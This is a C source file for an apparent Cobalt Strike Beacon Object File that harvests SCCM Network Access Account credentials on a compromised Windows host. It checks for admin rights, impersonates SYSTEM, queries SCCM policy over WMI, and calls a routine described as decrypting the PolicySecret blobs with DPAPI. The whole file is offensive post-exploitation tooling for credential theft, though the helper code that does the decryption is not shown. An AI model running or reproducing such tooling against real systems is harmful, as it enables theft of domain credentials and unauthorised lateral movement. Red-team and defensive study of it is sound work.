/*
 * sccm.c — BOF for SCCM CRED-3 triage
 *
 * Usage:
 *   sccm
 *
 * Queries live SCCM policy via WMI (CRED-3) and decrypts
 * NAA PolicySecret blobs locally with CryptUnprotectData as SYSTEM.
 * Requires high integrity (admin).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char* target_str = BeaconDataExtract(&parser, NULL);

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] SCCM triage requires high integrity (admin) context\n");
        return;
    }

    if (target_str && strlen(target_str) > 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] sccm no longer accepts /target:PATH; use sccm_disk for CRED-4 OBJECTS.DATA triage\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== DPAPI SCCM CRED-3 (BOF) ===\n");

    BOOL already_system = is_system();
    BOOL impersonated = FALSE;

    if (!already_system) {
        if (!get_system()) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Failed to impersonate SYSTEM; local SCCM DPAPI decrypt requires a SYSTEM token\n");
            return;
        }
        impersonated = TRUE;
    }

    triage_sccm_wmi();

    if (impersonated) revert_to_self_helper();
}
